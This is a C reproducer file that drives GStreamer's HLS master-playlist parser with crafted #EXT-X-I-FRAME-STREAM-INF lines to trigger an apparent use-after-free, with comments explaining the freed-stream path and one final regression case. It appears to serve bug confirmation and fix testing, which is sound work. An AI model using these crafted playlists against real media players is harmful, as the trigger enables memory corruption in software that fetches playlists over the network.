/* Standalone repro for candidate 028 (hls_m3u8_master_playlist_uaf).
 *
 * Compiles the project's own, unmodified ext/hls/m3u8.c and calls its real
 * public entry point gst_hls_master_playlist_new_from_data() - exactly the
 * function gsthlsdemux.c calls with the bytes of a master playlist fetched
 * over HTTP - with a crafted master playlist text. No internal state is
 * hand-constructed: this is the same "malformed file handed to the parser's
 * real public entry point" shape as any other file-parsing finding in this
 * project (see CONFIRMATION.md section 11).
 */

#include <gst/gst.h>
#include "m3u8.h"

GST_DEBUG_CATEGORY (hls_debug);

static void
run_case (const char *label, const char *data, const char *base_uri)
{
  g_print ("=== %s ===\n", label);
  GstHLSMasterPlaylist *playlist =
      gst_hls_master_playlist_new_from_data (g_strdup (data), base_uri);
  g_print ("  -> playlist=%p\n", (void *) playlist);
  if (playlist)
    gst_hls_master_playlist_unref (playlist);
}

int
main (int argc, char **argv)
{
  gst_init (&argc, &argv);
  GST_DEBUG_CATEGORY_INIT (hls_debug, "hlsdemux", 0, "HLS client");

  /* #EXT-X-I-FRAME-STREAM-INF with a URI attribute that uri_join() cannot
   * resolve against the given base_uri (base_uri has no '/' in it at all,
   * and the URI value is not itself a valid absolute URI) -> uri_join()
   * returns NULL -> the freshly-allocated GstHLSVariantStream is freed via
   * gst_hls_variant_stream_unref() (refcount 1 -> 0) while the enclosing
   * attribute-parsing loop still holds a pointer to it: the next attribute,
   * AUDIO="grp", is then parsed straight into the just-freed stream, and the
   * post-loop `if (stream->iframe)` check reads the freed stream again. */
  run_case ("relative-branch uri_join() failure + trailing AUDIO attribute",
      "#EXTM3U\n#EXT-X-I-FRAME-STREAM-INF:URI=\"rel\",AUDIO=\"grp\"\n", "abc");

  /* Same bug class, absolute branch of uri_join() (URI value starts with
   * '/'): base_uri has no ':' either, so uri_join() again returns NULL. */
  run_case ("absolute-branch uri_join() failure + trailing AUDIO attribute",
      "#EXTM3U\n#EXT-X-I-FRAME-STREAM-INF:URI=\"/rel\",AUDIO=\"grp\"\n", "abc");

  /* URI is the LAST attribute on the line (nothing after it) - exercises
   * the post-attribute-loop `if (stream->iframe) { ... stream->uri ... }`
   * use-after-free directly, without needing a second attribute at all. */
  run_case ("relative-branch uri_join() failure, URI is the last attribute",
      "#EXTM3U\n#EXT-X-I-FRAME-STREAM-INF:BANDWIDTH=1,URI=\"rel\"\n", "abc");

  /* Two consecutive failing i-frame streams, to check for any additional
   * corruption (e.g. a double free) across repeated failures in one parse. */
  run_case ("two consecutive failing i-frame streams",
      "#EXTM3U\n"
      "#EXT-X-I-FRAME-STREAM-INF:URI=\"rel\",AUDIO=\"a\"\n"
      "#EXT-X-I-FRAME-STREAM-INF:URI=\"rel2\",SUBTITLES=\"b\"\n", "abc");

  /* Regression check: a VALID i-frame stream (uri_join() succeeds) combined
   * with a normal EXT-X-STREAM-INF variant must still parse successfully,
   * exactly as before this bug's fix. */
  run_case ("valid i-frame stream + valid regular variant (no bug expected)",
      "#EXTM3U\n"
      "#EXT-X-I-FRAME-STREAM-INF:URI=\"iframe.m3u8\",AUDIO=\"a\"\n"
      "#EXT-X-STREAM-INF:BANDWIDTH=100\n"
      "variant.m3u8\n", "http://example.com/master.m3u8");

  g_print ("all cases completed without crashing\n");
  return 0;
}
